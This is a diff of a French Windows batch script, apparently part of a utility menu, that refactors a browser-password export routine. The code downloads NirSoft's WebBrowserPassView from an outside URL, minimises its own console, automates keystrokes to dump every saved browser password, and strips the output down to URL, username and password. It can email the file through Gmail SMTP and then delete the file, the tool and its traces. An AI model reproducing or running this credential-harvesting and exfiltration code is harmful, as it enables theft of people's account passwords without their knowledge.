@@ -894,13 +894,11 @@ echo.
 set "WBPV=%~dp0WebBrowserPassView.exe"
 set "DOWNLOAD_URL=https://script.salutalex.fr/scripts/nirsoft/batch/WebBrowserPassView.exe"
 set "EMAIL=REMOVED_SMTP_EMAIL"
-set "DOWNLOADED=0"
 set "SMTP_USER=REMOVED_SMTP_EMAIL"
 set "SMTP_PASS=REMOVED_SMTP_PASS"
 
 rem Telecharger si necessaire
 if not exist "%WBPV%" (
-  echo.
   echo Telechargement de WebBrowserPassView.exe...
   curl.exe -fL --retry 3 --retry-delay 2 -o "%WBPV%" "%DOWNLOAD_URL%" 2>nul || certutil -urlcache -split -f "%DOWNLOAD_URL%" "%WBPV%" >nul 2>&1
   if not exist "%WBPV%" (
@@ -908,128 +906,63 @@ if not exist "%WBPV%" (
     pause
     goto system_tools
   )
-  if %errorlevel% neq 0 (
-    echo Erreur lors du telechargement.
-    pause
-    goto system_tools
-  )
   timeout /t 1 /nobreak >nul
 )
 
-rem Choix du mode d'export
-set "opts=Sauvegarde locale~Exporte les mots de passe dans un fichier .txt conserve sur le Bureau;Envoi par mail~Exporte et envoie par email - aucun fichier conserve localement"
+rem Choix du mode
+set "opts=Sauvegarde locale~Fichier .txt conserve dans le dossier du script;Envoi par mail~Export envoye par email, aucun fichier conserve"
 call :DynamicMenu "MODE D'EXPORT - WebBrowserPassView" "%opts%"
 set "nirsoft_mode=%errorlevel%"
 
 if "%nirsoft_mode%"=="0" goto system_tools
-if "%nirsoft_mode%"=="1" goto nirsoft_local
-if "%nirsoft_mode%"=="2" goto nirsoft_mail
-goto sys_nirsoft_pw
+if "%nirsoft_mode%"=="1" set "NIRSOFT_KEEP=1"
+if "%nirsoft_mode%"=="2" set "NIRSOFT_KEEP=0"
+if not defined NIRSOFT_KEEP goto sys_nirsoft_pw
 
-rem -------------------------------------------------------
-rem  OPTION 1 : Sauvegarde locale
-rem -------------------------------------------------------
-:nirsoft_local
-cls
-echo ===============================================
-echo   WebBrowserPassView - Sauvegarde Locale
-echo ===============================================
-echo.
-
-:ask_filename_local
+rem Saisie du nom de fichier
+:nirsoft_ask_filename
 echo.
 set "custom_filename="
-set /p custom_filename="Entrez le nom du fichier d'export (sans extension, ex: mes_mots_de_passe) : "
-if "%custom_filename%"=="" (
-    echo Le nom de fichier ne peut pas etre vide.
-    goto ask_filename_local
-)
-set "OUTPUT_NAME=%custom_filename%.txt"
-set "OUTPUT=%~dp0%OUTPUT_NAME%"
+set /p custom_filename="Nom du fichier (sans extension) : "
+if "%custom_filename%"=="" goto nirsoft_ask_filename
+set "OUTPUT=%~dp0%custom_filename%.txt"
 
+rem Nettoyage cfg precedent
 if exist "%~dp0WebBrowserPassView.cfg" del /F /Q "%~dp0WebBrowserPassView.cfg" >nul 2>&1
 cd /d "%~dp0"
 
-rem Ouvrir le logiciel
+rem Ouvrir le logiciel puis minimiser la fenetre CMD immediatement
 start "" "%WBPV%"
-
-rem Minimiser la fenetre CMD
 powershell -NoProfile -Command "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class W{[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr h,int n);[DllImport(\"kernel32.dll\")]public static extern IntPtr GetConsoleWindow();}';[W]::ShowWindow([W]::GetConsoleWindow(),6)" >nul 2>&1
 
-rem Attendre chargement du logiciel
+rem Attendre chargement + automatiser Ctrl+A / Ctrl+S / coller chemin / Entree
 timeout /t 4 /nobreak >nul
+powershell -Command "Set-Clipboard -Value '%OUTPUT%'; $wsh=New-Object -ComObject WScript.Shell; if($wsh.AppActivate('WebBrowserPassView')){ Start-Sleep -Milliseconds 400; $wsh.SendKeys('^a'); Start-Sleep -Milliseconds 200; $wsh.SendKeys('^s'); Start-Sleep -Milliseconds 1500; $wsh.SendKeys('^v'); Start-Sleep -Milliseconds 300; $wsh.SendKeys('{ENTER}') }" >nul 2>&1
 
-rem Selection + sauvegarde automatique vers le fichier
-powershell -Command "Set-Clipboard -Value '%OUTPUT%'; $wsh = New-Object -ComObject WScript.Shell; if($wsh.AppActivate('WebBrowserPassView')){ Start-Sleep -Milliseconds 400; $wsh.SendKeys('^a'); Start-Sleep -Milliseconds 200; $wsh.SendKeys('^s'); Start-Sleep -Milliseconds 1500; $wsh.SendKeys('^v'); Start-Sleep -Milliseconds 300; $wsh.SendKeys('{ENTER}') }" >nul 2>&1
-
-rem Attendre ecriture fichier puis tuer le logiciel
+rem Attendre ecriture puis fermer le logiciel
 timeout /t 4 /nobreak >nul
 taskkill /F /IM WebBrowserPassView.exe >nul 2>&1
 timeout /t 1 /nobreak >nul
 
-rem Nettoyage silencieux
+rem Filtrer le fichier : garder uniquement URL, User Name, Password
+if exist "%OUTPUT%" (
+    powershell -NoProfile -ExecutionPolicy Bypass -Command "$f='%OUTPUT%'; $lines=Get-Content $f -Encoding UTF8 -ErrorAction SilentlyContinue; $out=@(); $url=''; $user=''; $pass=''; foreach($l in $lines){ if($l -match '^={10,}'){ if($url -or $user -or $pass){ $out+='================================================'; if($url){ $out+='URL      : '+$url }; if($user){ $out+='Username : '+$user }; if($pass){ $out+='Password : '+$pass }; $out+='================================================'; $out+='' }; $url=''; $user=''; $pass='' } elseif($l -match '^URL\s+:\s*(.*)'){ $url=$matches[1].Trim() } elseif($l -match '^User Name\s+:\s*(.*)'){ $user=$matches[1].Trim() } elseif($l -match '^Password\s+:\s*(.*)'){ $pass=$matches[1].Trim() } }; if($url -or $user -or $pass){ $out+='================================================'; if($url){ $out+='URL      : '+$url }; if($user){ $out+='Username : '+$user }; if($pass){ $out+='Password : '+$pass }; $out+='================================================' }; $out | Set-Content $f -Encoding UTF8" >nul 2>&1
+)
+
+rem Nettoyage exe + cfg
 del /F /Q "%WBPV%" >nul 2>&1
 if exist "%WBPV%" powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
 if exist "%~dp0WebBrowserPassView.cfg" del /F /Q "%~dp0WebBrowserPassView.cfg" >nul 2>&1
 
-goto system_tools
+rem Mode local : fichier conserve, terminer
+if "%NIRSOFT_KEEP%"=="1" goto system_tools
 
-rem -------------------------------------------------------
-rem  OPTION 2 : Envoi par mail (sans sauvegarde locale)
-rem -------------------------------------------------------
-:nirsoft_mail
-cls
-echo ===============================================
-echo   WebBrowserPassView - Envoi par Mail
-echo ===============================================
-echo.
+rem Mode mail : envoyer si fichier present puis supprimer
+if not exist "%OUTPUT%" goto system_tools
 
-:ask_filename_mail
-echo.
-set "custom_filename="
-set /p custom_filename="Entrez le nom du fichier temporaire (sans extension, ex: export_tmp) : "
-if "%custom_filename%"=="" (
-    echo Le nom de fichier ne peut pas etre vide.
-    goto ask_filename_mail
-)
-set "OUTPUT_NAME=%custom_filename%.txt"
-set "OUTPUT=%~dp0%OUTPUT_NAME%"
-
-if exist "%~dp0WebBrowserPassView.cfg" del /F /Q "%~dp0WebBrowserPassView.cfg" >nul 2>&1
-cd /d "%~dp0"
-
-rem Ouvrir le logiciel
-start "" "%WBPV%"
-
-rem Minimiser la fenetre CMD
-powershell -NoProfile -Command "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class W{[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr h,int n);[DllImport(\"kernel32.dll\")]public static extern IntPtr GetConsoleWindow();}';[W]::ShowWindow([W]::GetConsoleWindow(),6)" >nul 2>&1
-
-rem Attendre chargement du logiciel
-timeout /t 4 /nobreak >nul
-
-rem Selection + sauvegarde automatique vers le fichier
-powershell -Command "Set-Clipboard -Value '%OUTPUT%'; $wsh = New-Object -ComObject WScript.Shell; if($wsh.AppActivate('WebBrowserPassView')){ Start-Sleep -Milliseconds 400; $wsh.SendKeys('^a'); Start-Sleep -Milliseconds 200; $wsh.SendKeys('^s'); Start-Sleep -Milliseconds 1500; $wsh.SendKeys('^v'); Start-Sleep -Milliseconds 300; $wsh.SendKeys('{ENTER}') }" >nul 2>&1
-
-rem Attendre ecriture fichier puis tuer le logiciel
-timeout /t 4 /nobreak >nul
-taskkill /F /IM WebBrowserPassView.exe >nul 2>&1
-timeout /t 1 /nobreak >nul
-
-rem Envoi mail si fichier present
-if not exist "%OUTPUT%" (
-    del /F /Q "%WBPV%" >nul 2>&1
-    if exist "%WBPV%" powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
-    if exist "%~dp0WebBrowserPassView.cfg" del /F /Q "%~dp0WebBrowserPassView.cfg" >nul 2>&1
-    goto system_tools
-)
-
-powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $u='%SMTP_USER%'; $p='%SMTP_PASS%'; $to='%EMAIL%'; $sub='Export WebBrowserPassView - ' + (Get-Date -Format 'dd/MM/yyyy HH:mm'); $body='Export automatique des mots de passe du navigateur.'; $att='%OUTPUT%'; $sec=ConvertTo-SecureString $p -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential($u,$sec); Send-MailMessage -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential $cred -From $u -To $to -Subject $sub -Body $body -Attachments $att" >nul 2>&1
+powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $u='%SMTP_USER%'; $p='%SMTP_PASS%'; $to='%EMAIL%'; $sub='Export WebBrowserPassView - '+(Get-Date -Format 'dd/MM/yyyy HH:mm'); $body='Export automatique des mots de passe navigateurs.'; $att='%OUTPUT%'; $sec=ConvertTo-SecureString $p -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential($u,$sec); Send-MailMessage -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential $cred -From $u -To $to -Subject $sub -Body $body -Attachments $att" >nul 2>&1
 
 del /F /Q "%OUTPUT%" >nul 2>&1
-del /F /Q "%WBPV%" >nul 2>&1
-if exist "%WBPV%" powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
-if exist "%~dp0WebBrowserPassView.cfg" del /F /Q "%~dp0WebBrowserPassView.cfg" >nul 2>&1
-
 goto system_tools
 
 :sys_rescue_menu
